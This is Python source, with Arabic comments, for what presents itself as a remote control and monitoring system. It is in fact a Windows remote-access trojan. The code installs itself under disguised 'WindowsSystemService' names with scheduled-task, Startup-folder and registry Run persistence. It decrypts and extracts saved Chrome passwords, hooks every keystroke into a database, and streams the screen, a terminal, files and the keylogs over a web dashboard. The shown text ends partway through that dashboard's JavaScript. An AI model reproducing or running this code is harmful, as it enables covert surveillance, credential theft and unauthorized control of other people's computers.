
import asyncio
import aiohttp
from aiohttp import web
import mss
import cv2
import numpy as np
import time
import secrets
import socket
import requests
import subprocess
import threading
import re
import os
import json
import keyboard
from pynput.mouse import Controller as MouseController, Button as MouseButton
from pathlib import Path
import shutil
import mimetypes
import psutil
import platform
from datetime import datetime
import humanize
from urllib.parse import quote, unquote
import GPUtil
from screeninfo import get_monitors
import matplotlib.pyplot as plt
import io
import base64
from concurrent.futures import ThreadPoolExecutor
import logging
from logging.handlers import RotatingFileHandler
import sqlite3
from cryptography.fernet import Fernet
import browser_cookie3
import win32crypt
from Crypto.Cipher import AES
import winreg
import sys

# ==============================================
# نظام التحكم عن بعد المتكامل - الإصدار النهائي
# ==============================================

# --------- إعدادات متقدمة ---------
FPS = 60
MAX_WIDTH = 1920
JPEG_QUALITY = 90
PORT = 8080
TOKEN = secrets.token_urlsafe(32)
CONTROL_PASSWORD = "SecurePass123!"
FILE_DIRECTORY = "./shared_files"
MAX_UPLOAD_SIZE = 500 * 1024 * 1024
SESSION_TIMEOUT = 3600
# ----------------------------------

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        RotatingFileHandler('system.log', maxBytes=10*1024*1024, backupCount=5),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("UltimateControlSystem")

# تحديد مسارات النسخ
current_file = os.path.abspath(sys.argv[0])
temp_path = os.path.join(os.environ.get('TEMP', os.getcwd()), "WindowsSystemService.exe")
appdata_path = os.path.join(os.environ.get('APPDATA', os.getcwd()), "MicrosoftSystem", "SystemService.exe")

# إنشاء مجلدات النظام
os.makedirs(FILE_DIRECTORY, exist_ok=True)
os.makedirs("./reports", exist_ok=True)
os.makedirs("./database", exist_ok=True)
os.makedirs(os.path.dirname(appdata_path), exist_ok=True)

# مؤشر الماوس
mouse = MouseController()

# متغيرات النظام
frame = None
system_stats = {
    "start_time": time.time(),
    "cpu_usage": [],
    "memory_usage": [],
    "network_usage": [],
    "disk_usage": [],
    "gpu_usage": []
}

# مؤشرات الأداء
performance_metrics = {
    "frame_times": [],
    "response_times": [],
    "connection_count": 0,
    "active_sessions": {}
}

# إعداد تنفيذ الخيوط
executor = ThreadPoolExecutor(max_workers=20)

# مفتاح التشفير
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

# --------- إعداد التثبيت التلقائي ---------
def install_system():
    """تثبيت النظام للتشغيل التلقائي"""
    try:
        # نسخ الملف إلى مجلد TEMP
        if not os.path.exists(temp_path):
            shutil.copyfile(current_file, temp_path)
            logger.info(f"تم النسخ إلى مجلد TEMP: {temp_path}")
        
        # نسخ الملف إلى مجلد AppData
        if not os.path.exists(appdata_path):
            shutil.copyfile(current_file, appdata_path)
            logger.info(f"تم النسخ إلى مجلد AppData: {appdata_path}")
        
        # إنشاء مهمة مجدولة للتشغيل التلقائي
        create_scheduled_task()
        
        # إضافة إلى بدء التشغيل
        add_to_startup()
        
        # إضافة إلى السجل
        add_to_registry()
        
        logger.info("تم تثبيت النظام بنجاح للتشغيل التلقائي")
        
    except Exception as e:
        logger.error(f"خطأ في التثبيت: {e}")

def create_scheduled_task():
    """إنشاء مهمة مجدولة للتشغيل التلقائي"""
    try:
        task_name = "WindowsSystemService"
        cmd = [
            "schtasks", "/Create", "/SC", "ONLOGON", "/RL", "HIGHEST",
            "/TN", task_name, "/TR", f'"{appdata_path}"', "/F"
        ]
        subprocess.run(cmd, check=True, capture_output=True)
        logger.info(f"تم إنشاء المهمة المجدولة: {task_name}")
    except subprocess.CalledProcessError as e:
        logger.error(f"فشل إنشاء المهمة المجدولة: {e}")

def add_to_startup():
    """إضافة إلى بدء التشغيل"""
    try:
        startup_path = os.path.join(os.environ["APPDATA"], 
                                   "Microsoft", "Windows", "Start Menu", 
                                   "Programs", "Startup", "SystemService.lnk")
        
        # إنشاء اختصار
        if hasattr(sys, '_MEIPASS'):
            # إذا كان ملف PyInstaller
            ico_path = os.path.join(sys._MEIPASS, 'icon.ico')
        else:
            ico_path = None
        
        # إنشاء اختصار باستخدام PowerShell
        ps_script = f'''
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("{startup_path}")
        $Shortcut.TargetPath = "{appdata_path}"
        $Shortcut.WorkingDirectory = "{os.path.dirname(appdata_path)}"
        $Shortcut.Save()
        '''
        
        subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
        logger.info(f"تم إضافة الاختصار إلى بدء التشغيل: {startup_path}")
        
    except Exception as e:
        logger.error(f"خطأ في إضافة بدء التشغيل: {e}")

def add_to_registry():
    """إضافة إلى السجل"""
    try:
        if platform.system() == "Windows":
            # إضافة إلى RUN Registry
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsSystemService", 0, winreg.REG_SZ, appdata_path)
            
            logger.info("تم إضافة النظام إلى سجل Windows")
    except Exception as e:
        logger.error(f"خطأ في إضافة السجل: {e}")

def uninstall_system():
    """إلغاء تثبيت النظام وإزالة جميع الملفات"""
    try:
        # إيقاف المهمة المجدولة
        try:
            subprocess.run(["schtasks", "/Delete", "/TN", "WindowsSystemService", "/F"], 
                          capture_output=True)
        except:
            pass
        
        # إزالة من بدء التشغيل
        try:
            startup_path = os.path.join(os.environ["APPDATA"], 
                                       "Microsoft", "Windows", "Start Menu", 
                                       "Programs", "Startup", "SystemService.lnk")
            if os.path.exists(startup_path):
                os.remove(startup_path)
        except:
            pass
        
        # إزالة من السجل
        try:
            if platform.system() == "Windows":
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                    try:
                        winreg.DeleteValue(regkey, "WindowsSystemService")
                    except:
                        pass
        except:
            pass
        
        # إزالة الملفات
        try:
            if os.path.exists(temp_path):
                os.remove(temp_path)
        except:
            pass
        
        try:
            if os.path.exists(appdata_path):
                os.remove(appdata_path)
        except:
            pass
        
        try:
            appdata_dir = os.path.dirname(appdata_path)
            if os.path.exists(appdata_dir):
                shutil.rmtree(appdata_dir)
        except:
            pass
        
        logger.info("تم إلغاء تثبيت النظام وإزالة جميع الملفات")
        return True
        
    except Exception as e:
        logger.error(f"خطأ في الإلغاء: {e}")
        return False

# --------- دوال جلب كلمات المرور من المتصفحات ---------
def get_chrome_encryption_key():
    """جلب مفتاح التشفير من متصفح Chrome"""
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        logger.error(f"خطأ في جلب مفتاح التشفير: {e}")
        return None

def decrypt_password(password, key):
    """فك تشفير كلمة المرور"""
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        logger.error(f"خطأ في فك التشفير: {e}")
        return "فك التشفير فشل"

def get_chrome_passwords():
    """جلب كلمات المرور من متصفح Chrome"""
    try:
        key = get_chrome_encryption_key()
        if not key:
            return []
        
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                              "Google", "Chrome", "User Data", "default", "Login Data")
        
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        passwords = []
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
                
                passwords.append({
                    "url": url,
                    "username": username,
                    "password": decrypted_password
                })
        
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        
        return passwords
    except Exception as e:
        logger.error(f"خطأ في جلب كلمات مرور Chrome: {e}")
        return []

# --------- قاعدة البيانات المتقدمة ---------
def init_database():
    """تهيئة قاعدة البيانات للتسجيل والمراقبة"""
    try:
        conn = sqlite3.connect('./database/system_metrics.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                cpu_percent REAL,
                memory_percent REAL,
                disk_percent REAL,
                network_sent REAL,
                network_recv REAL,
                gpu_temp REAL,
                gpu_usage REAL
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                start_time DATETIME DEFAULT CURRENT_TIMESTAMP,
                end_time DATETIME,
                remote_addr TEXT,
                user_agent TEXT,
                actions_count INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                event_type TEXT,
                event_details TEXT,
                severity TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS key_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                window_title TEXT,
                key_data TEXT,
                process_name TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("تم تهيئة قاعدة البيانات بنجاح")
        
    except Exception as e:
        logger.error(f"خطأ في تهيئة قاعدة البيانات: {e}")

def log_system_metrics():
    """تسجيل مقاييس النظام في قاعدة البيانات"""
    try:
        cpu_percent = psutil.cpu_percent()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        net_io = psutil.net_io_counters()
        
        gpu_temp = None
        gpu_usage = None
        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                gpu_temp = gpus[0].temperature
                gpu_usage = gpus[0].load * 100
        except:
            pass
        
        conn = sqlite3.connect('./database/system_metrics.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO system_metrics 
            (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, gpu_temp, gpu_usage)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (cpu_percent, memory.percent, disk.percent, 
              net_io.bytes_sent, net_io.bytes_recv, gpu_temp, gpu_usage))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logger.error(f"خطأ في تسجيل مقاييس النظام: {e}")

def log_key_event(window_title, key_data, process_name):
    """تسجيل حدث لوحة المفاتيح"""
    try:
        conn = sqlite3.connect('./database/system_metrics.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO key_logs (window_title, key_data, process_name)
            VALUES (?, ?, ?)
        ''', (window_title, key_data, process_name))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logger.error(f"خطأ في تسجيل حدث لوحة المفاتيح: {e}")

# --------- Keylogger المتقدم ---------
import pyautogui
import ctypes

def get_foreground_window_title():
    """الحصول على عنوان النافذة النشطة"""
    try:
        return pyautogui.getActiveWindow().title
    except:
        return "Unknown"

def get_foreground_process_name():
    """الحصول على اسم العملية النشطة"""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        pid = ctypes.c_ulong()
        ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        process = psutil.Process(pid.value)
        return process.name()
    except:
        return "Unknown"

def on_key_event(e):
    """معالج حدث لوحة المفاتيح"""
    try:
        window_title = get_foreground_window_title()
        process_name = get_foreground_process_name()
        
        key_name = e.name
        event_type = e.event_type
        
        # تجاهل مفاتيح التحكم
        control_keys = ['shift', 'ctrl', 'alt', 'cmd', 'windows', 'tab', 'caps lock']
        if key_name.lower() in control_keys:
            return
        
        # تسجيل الحدث
        log_data = f"{event_type}: {key_name}"
        log_key_event(window_title, log_data, process_name)
        
    except Exception as ex:
        logger.error(f"خطأ في معالج الأحداث: {ex}")

# بدء Keylogger
keyboard.hook(on_key_event)

# --------- دوال المراقبة المتقدمة ---------
async def monitor_system_resources():
    """مراقبة موارد النظام بشكل مستمر"""
    while True:
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            net_io = psutil.net_io_counters()
            
            gpu_temp = None
            gpu_usage = None
            try:
                gpus = GPUtil.getGPUs()
                if gpus:
                    gpu_temp = gpus[0].temperature
                    gpu_usage = gpus[0].load * 100
            except:
                pass
            
            system_stats["cpu_usage"].append(cpu_percent)
            system_stats["memory_usage"].append(memory.percent)
            system_stats["disk_usage"].append(disk.percent)
            
            await asyncio.get_event_loop().run_in_executor(executor, log_system_metrics)
            
            for key in ["cpu_usage", "memory_usage", "disk_usage"]:
                if len(system_stats[key]) > 300:
                    system_stats[key] = system_stats[key][-300:]
            
            await asyncio.sleep(1)
            
        except Exception as e:
            logger.error(f"خطأ في مراقبة الموارد: {e}")
            await asyncio.sleep(5)

def get_detailed_system_info():
    """الحصول على معلومات مفصلة عن النظام"""
    try:
        boot_time = psutil.boot_time()
        uptime = time.time() - boot_time
        
        cpu_count = psutil.cpu_count()
        cpu_freq = psutil.cpu_freq()
        cpu_info = f"{cpu_count} cores @ {cpu_freq.current if cpu_freq else 'N/A'} MHz"
        
        memory = psutil.virtual_memory()
        memory_info = f"{memory.used / (1024**3):.2f}GB / {memory.total / (1024**3):.2f}GB ({memory.percent}%)"
        
        disk = psutil.disk_usage('/')
        disk_info = f"{disk.used / (1024**3):.2f}GB / {disk.total / (1024**3):.2f}GB ({disk.percent}%)"
        
        net_io = psutil.net_io_counters()
        network_info = f"↑{net_io.bytes_sent / (1024**2):.2f}MB ↓{net_io.bytes_recv / (1024**2):.2f}MB"
        
        gpu_info = "N/A"
        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                gpu_info = f"{gpus[0].name} - {gpus[0].load * 100:.1f}% - {gpus[0].temperature}°C"
        except:
            pass
        
        system_info = {
            "platform": platform.platform(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "uptime": humanize.naturaltime(datetime.fromtimestamp(boot_time)),
            "uptime_seconds": uptime,
            "cpu_info": cpu_info,
            "memory_info": memory_info,
            "disk_info": disk_info,
            "network_info": network_info,
            "gpu_info": gpu_info,
            "python_version": platform.python_version(),
            "system_architecture": platform.architecture()[0]
        }
        
        return system_info
    except Exception as e:
        logger.error(f"خطأ في جلب معلومات النظام: {e}")
        return {}

def generate_performance_report():
    """إنشاء تقرير أداء مفصل"""
    try:
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "system_info": get_detailed_system_info(),
            "performance_metrics": {
                "avg_cpu": sum(system_stats.get("cpu_usage", [0])) / max(1, len(system_stats.get("cpu_usage", [1]))),
                "avg_memory": sum(system_stats.get("memory_usage", [0])) / max(1, len(system_stats.get("memory_usage", [1]))),
                "avg_disk": sum(system_stats.get("disk_usage", [0])) / max(1, len(system_stats.get("disk_usage", [1]))),
                "total_connections": performance_metrics["connection_count"],
                "avg_response_time": sum(performance_metrics["response_times"]) / max(1, len(performance_metrics["response_times"])),
                "avg_frame_time": sum(performance_metrics["frame_times"]) / max(1, len(performance_metrics["frame_times"])),
                "active_sessions": len(performance_metrics["active_sessions"])
            },
            "resource_usage": {
                "cpu_history": system_stats.get("cpu_usage", []),
                "memory_history": system_stats.get("memory_usage", []),
                "disk_history": system_stats.get("disk_usage", [])
            }
        }
        
        report_file = f"./reports/performance_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=4, ensure_ascii=False)
        
        logger.info(f"تم إنشاء تقرير الأداء: {report_file}")
        return report_file
    except Exception as e:
        logger.error(f"خطأ في إنشاء التقرير: {e}")
        return None

def create_resource_plot():
    """إنشاء رسم بياني لاستخدام الموارد"""
    try:
        plt.figure(figsize=(12, 8))
        
        time_points = list(range(len(system_stats.get("cpu_usage", []))))
        
        if time_points:
            plt.subplot(2, 1, 1)
            plt.plot(time_points, system_stats.get("cpu_usage", []), label='CPU %', linewidth=2, color='blue')
            plt.plot(time_points, system_stats.get("memory_usage", []), label='Memory %', linewidth=2, color='green')
            plt.plot(time_points, system_stats.get("disk_usage", []), label='Disk %', linewidth=2, color='red')
            
            plt.xlabel('Time (seconds)')
            plt.ylabel('Usage (%)')
            plt.title('System Resource Usage Over Time')
            plt.legend()
            plt.grid(True, alpha=0.3)
            
            plt.subplot(2, 1, 2)
            if performance_metrics["frame_times"]:
                frame_times = performance_metrics["frame_times"][-100:]
                plt.plot(range(len(frame_times)), frame_times, label='Frame Time (ms)', linewidth=2, color='purple')
            
            if performance_metrics["response_times"]:
                response_times = performance_metrics["response_times"][-100:]
                plt.plot(range(len(response_times)), response_times, label='Response Time (ms)', linewidth=2, color='orange')
            
            plt.xlabel('Requests')
            plt.ylabel('Time (ms)')
            plt.title('Performance Metrics')
            plt.legend()
            plt.grid(True, alpha=0.3)
            
            plt.tight_layout()
            
            buf = io.BytesIO()
            plt.savefig(buf, format='png', dpi=100, bbox_inches='tight')
            buf.seek(0)
            
            img_base64 = base64.b64encode(buf.read()).decode('utf-8')
            plt.close()
            
            return f"data:image/png;base64,{img_base64}"
        return None
    except Exception as e:
        logger.error(f"خطأ في إنشاء الرسم البياني: {e}")
        return None

# --------- بث الشاشة المتقدم ---------
async def advanced_capture_loop():
    """دورة متقدمة لالتقاط الشاشة مع تحسين الأداء"""
    global frame, performance_metrics
    
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        screen_width = monitor["width"]
        screen_height = monitor["height"]
        aspect_ratio = screen_width / screen_height
        
        while True:
            start_time = time.time()
            
            try:
                img = sct.grab(monitor)
                arr = np.array(img)
                bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
                
                if screen_width > MAX_WIDTH:
                    new_width = MAX_WIDTH
                    new_height = int(new_width / aspect_ratio)
                    bgr = cv2.resize(bgr, (new_width, new_height), interpolation=cv2.INTER_LANCZOS4)
                
                bgr = cv2.GaussianBlur(bgr, (3, 3), 0)
                bgr = cv2.convertScaleAbs(bgr, alpha=1.1, beta=10)
                
                current_cpu = psutil.cpu_percent()
                dynamic_quality = max(40, min(95, 95 - int(current_cpu / 2)))
                
                success, jpeg = cv2.imencode('.jpg', bgr, [
                    int(cv2.IMWRITE_JPEG_QUALITY), dynamic_quality,
                    int(cv2.IMWRITE_JPEG_OPTIMIZE), 1,
                    int(cv2.IMWRITE_JPEG_PROGRESSIVE), 1
                ])
                
                if success:
                    frame = jpeg.tobytes()
                    frame_time = (time.time() - start_time) * 1000
                    performance_metrics["frame_times"].append(frame_time)
                    
                    if len(performance_metrics["frame_times"]) > 500:
                        performance_metrics["frame_times"] = performance_metrics["frame_times"][-500:]
                
                current_fps = 1.0 / max(0.001, (time.time() - start_time))
                target_delay = max(0.001, (1.0 / FPS) - (current_fps - FPS) * 0.001)
                
                await asyncio.sleep(target_delay)
                
            except Exception as e:
                logger.error(f"خطأ في التقاط الشاشة: {e}")
                await asyncio.sleep(1.0 / FPS)

# --------- معالجات الويب المتقدمة ---------
async def advanced_stream_handler(request):
    """معالج بث متقدم مع تحسين الأداء"""
    global frame
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.Response(text="Unauthorized", status=401)

    start_time = time.time()

    async def response_gen():
        boundary = "--frame"
        last_frame_time = 0
        
        while True:
            try:
                if frame is None:
                    await asyncio.sleep(0.01)
                    continue
                
                current_time = time.time()
                if current_time - last_frame_time < 1.0 / FPS:
                    await asyncio.sleep(0.001)
                    continue
                
                yield (b"%s\r\nContent-Type: image/jpeg\r\nContent-Length: " % boundary.encode() + 
                       f"{len(frame)}".encode() + b"\r\n\r\n" + frame + b"\r\n")
                
                last_frame_time = current_time
                await asyncio.sleep(1.0 / FPS)
                
            except Exception as e:
                logger.error(f"خطأ في بث الإطار: {e}")
                await asyncio.sleep(0.1)

    response_time = (time.time() - start_time) * 1000
    performance_metrics["response_times"].append(response_time)
    
    if len(performance_metrics["response_times"]) > 1000:
        performance_metrics["response_times"] = performance_metrics["response_times"][-1000:]

    return web.Response(body=response_gen(), content_type='multipart/x-mixed-replace; boundary=frame')

async def system_dashboard_handler(request):
    """لوحة تحكم متقدمة لعرض أداء النظام"""
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.Response(text="Unauthorized", status=401)
    
    system_info = get_detailed_system_info()
    resource_plot = create_resource_plot()
    
    avg_cpu = sum(system_stats.get("cpu_usage", [0])) / max(1, len(system_stats.get("cpu_usage", [1])))
    avg_memory = sum(system_stats.get("memory_usage", [0])) / max(1, len(system_stats.get("memory_usage", [1])))
    avg_disk = sum(system_stats.get("disk_usage", [0])) / max(1, len(system_stats.get("disk_usage", [1])))
    
    html = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة مراقبة النظام المتقدمة</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {{
                --primary: #0a0a1a;
                --secondary: #121228;
                --accent: #00f3ff;
                --accent-dark: #0077ff;
                --text: #ffffff;
                --text-secondary: #a0a0c0;
                --card-bg: rgba(16, 16, 40, 0.7);
                --glow: 0 0 10px var(--accent), 0 0 20px var(--accent-dark);
                --success: #00ff87;
                --error: #ff3366;
                --warning: #ffcc00;
            }}

            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }}

            body {{
                background: linear-gradient(135deg, var(--primary), var(--secondary));
                color: var(--text);
                min-height: 100vh;
                line-height: 1.6;
                overflow-x: hidden;
                padding: 20px;
            }}

            .container {{
                max-width: 1800px;
                margin: 0 auto;
            }}

            header {{
                text-align: center;
                margin-bottom: 30px;
                padding: 20px 0;
                border-bottom: 1px solid rgba(0, 243, 255, 0.3);
            }}

            .logo {{
                font-size: 2.8rem;
                font-weight: 700;
                margin-bottom: 10px;
                color: var(--accent);
                text-shadow: var(--glow);
                letter-spacing: 2px;
            }}

            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
                gap: 25px;
                margin-bottom: 30px;
            }}

            .stat-card {{
                background: var(--card-bg);
                padding: 25px;
                border-radius: 20px;
                border: 1px solid rgba(0, 243, 255, 0.2);
                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
                backdrop-filter: blur(15px);
                transition: transform 0.3s ease, box-shadow 0.3s ease;
            }}

            .stat-card:hover {{
                transform: translateY(-5px);
                box-shadow: 0 15px 35px rgba(0, 119, 255, 0.3), var(--glow);
            }}

            .stat-title {{
                font-size: 1.2rem;
                color: var(--text-secondary);
                margin-bottom: 20px;
                display: flex;
                align-items: center;
                gap: 12px;
            }}

            .stat-value {{
                font-size: 2.5rem;
                font-weight: 800;
                margin-bottom: 15px;
                background: linear-gradient(135deg, var(--accent), var(--accent-dark));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }}

            .progress-bar {{
                height: 12px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 8px;
                margin: 15px 0;
                overflow: hidden;
            }}

            .progress-fill {{
                height: 100%;
                border-radius: 8px;
                transition: width 0.5s ease;
            }}

            .cpu-progress {{ background: linear-gradient(90deg, var(--accent-dark), var(--accent)); }}
            .memory-progress {{ background: linear-gradient(90deg, #ff3366, #ff6699); }}
            .disk-progress {{ background: linear-gradient(90deg, #00ff87, #00ffcc); }}

            .actions-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }}

            .action-btn {{
                padding: 18px;
                background: linear-gradient(135deg, var(--accent-dark), var(--accent));
                border: none;
                border-radius: 12px;
                color: white;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 12px;
                font-size: 1.1rem;
            }}

            .action-btn:hover {{
                transform: translateY(-5px);
                box-shadow: 0 10px 25px rgba(0, 119, 255, 0.5), var(--glow);
            }}

            .system-info {{
                background: var(--card-bg);
                padding: 25px;
                border-radius: 20px;
                border: 1px solid rgba(0, 243, 255, 0.2);
                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
                backdrop-filter: blur(15px);
                margin-bottom: 30px;
            }}

            .info-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
            }}

            .info-item {{
                padding: 15px;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 12px;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }}

            .info-label {{
                font-size: 0.95rem;
                color: var(--text-secondary);
                margin-bottom: 8px;
                display: flex;
                align-items: center;
                gap: 8px;
            }}

            .info-value {{
                font-size: 1.2rem;
                font-weight: 500;
                color: var(--accent);
            }}

            .live-preview {{
                background: var(--card-bg);
                padding: 25px;
                border-radius: 20px;
                border: 1px solid rgba(0, 243, 255, 0.2);
                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
                backdrop-filter: blur(15px);
                margin-bottom: 30px;
                text-align: center;
            }}

            .preview-frame {{
                width: 100%;
                max-width: 800px;
                height: 450px;
                border: 2px solid var(--accent);
                border-radius: 15px;
                box-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
                margin: 0 auto;
            }}

            .uninstall-btn {{
                background: linear-gradient(135deg, #ff3366, #ff6699) !important;
            }}

            .uninstall-btn:hover {{
                box-shadow: 0 10px 25px rgba(255, 51, 102, 0.5) !important;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <header>
                <h1 class="logo"><i class="fas fa-rocket"></i> لوحة مراقبة النظام المتقدمة</h1>
            </header>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-title"><i class="fas fa-microchip"></i> معالج المركزية</div>
                    <div class="stat-value" id="cpu-value">{avg_cpu:.1f}%</div>
                    <div class="progress-bar">
                        <div class="progress-fill cpu-progress" style="width: {avg_cpu}%"></div>
                    </div>
                </div>

                <div class="stat-card">
                    <div class="stat-title"><i class="fas fa-memory"></i> الذاكرة</div>
                    <div class="stat-value" id="memory-value">{avg_memory:.1f}%</div>
                    <div class="progress-bar">
                        <div class="progress-fill memory-progress" style="width: {avg_memory}%"></div>
                    </div>
                </div>

                <div class="stat-card">
                    <div class="stat-title"><i class="fas fa-hdd"></i> القرص الصلب</div>
                    <div class="stat-value" id="disk-value">{avg_disk:.1f}%</div>
                    <div class="progress-bar">
                        <div class="progress-fill disk-progress" style="width: {avg_disk}%"></div>
                    </div>
                </div>
            </div>

            <div class="live-preview">
                <h2><i class="fas fa-desktop"></i> البث المباشر للشاشة</h2>
                <img src="/stream?token={token}" alt="بث مباشر للشاشة" class="preview-frame">
            </div>

            <div class="system-info">
                <h2><i class="fas fa-info-circle"></i> معلومات النظام التفصيلية</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-desktop"></i> نظام التشغيل</div>
                        <div class="info-value">{system_info.get('platform', 'N/A')}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-microchip"></i> المعالج</div>
                        <div class="info-value">{system_info.get('processor', 'N/A')}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-computer"></i> اسم الجهاز</div>
                        <div class="info-value">{system_info.get('hostname', 'N/A')}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-clock"></i> مدة التشغيل</div>
                        <div class="info-value">{system_info.get('uptime', 'N/A')}</div>
                    </div>
                </div>
            </div>

            <div class="actions-grid">
                <button class="action-btn" onclick="openControlPanel()">
                    <i class="fas fa-gamepad"></i> لوحة التحكم
                </button>
                <button class="action-btn" onclick="openProcessManager()">
                    <i class="fas fa-tasks"></i> إدارة العمليات
                </button>
                <button class="action-btn" onclick="openFileManager()">
                    <i class="fas fa-folder"></i> مدير الملفات
                </button>
                <button class="action-btn" onclick="openTerminal()">
                    <i class="fas fa-terminal"></i> الطرفية
                </button>
                <button class="action-btn" onclick="openKeylogger()">
                    <i class="fas fa-keyboard"></i> سجلات لوحة المفاتيح
                </button>
                <button class="action-btn uninstall-btn" onclick="uninstallSystem()">
                    <i class="fas fa-trash"></i> إلغاء التثبيت
                </button>
            </div>
        </div>

        <script>
            function openControlPanel() {{
                window.open('/control?token={token}', '_blank');
            }}
            
            function openProcessManager() {{
                window.open('/processes?token={token}', '_blank');
            }}
            
            function openFileManager() {{
                window.open('/files?token={token}', '_blank');
            }}
            
            function openTerminal() {{
                window.open('/terminal?token={token}', '_blank');
            }}
            
            function openKeylogger() {{
                window.open('/keylogs?token={token}', '_blank');
            }}
            
            function uninstallSystem() {{
                if (confirm('هل أنت متأكد من أنك تريد إلغاء تثبيت النظام؟ سيتم إزالة جميع الملفات والإعدادات.')) {{
                    fetch('/system/uninstall?token={token}', {{ method: 'POST' }})
                        .then(response => response.json())
                        .then(data => {{
                            if (data.success) {{
                                alert('تم إلغاء التثبيت بنجاح. سيتم إغلاق النظام.');
                                window.close();
                            }} else {{
                                alert('حدث خطأ أثناء إلغاء التثبيت: ' + data.error);
